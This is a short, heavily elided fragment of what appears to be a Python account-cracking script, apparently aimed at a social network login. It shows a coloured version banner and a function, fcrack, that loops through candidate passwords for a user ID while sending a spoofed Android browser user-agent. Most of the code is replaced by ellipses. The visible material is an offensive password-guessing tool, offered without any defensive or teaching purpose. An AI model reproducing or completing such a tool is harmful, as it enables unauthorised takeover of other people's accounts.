...
--------------------------------------------------
[•] \033[1;37mVERSION    :\033[1;32m 22.0 \033[1;33m"DON'T WORRY FOR UPDATES!"\033[1;33m
--------------------------------------------------"""
...
def fcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent': 'Mozilla/5.0 (Linux; U; Android 9; SM-N950F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36',}
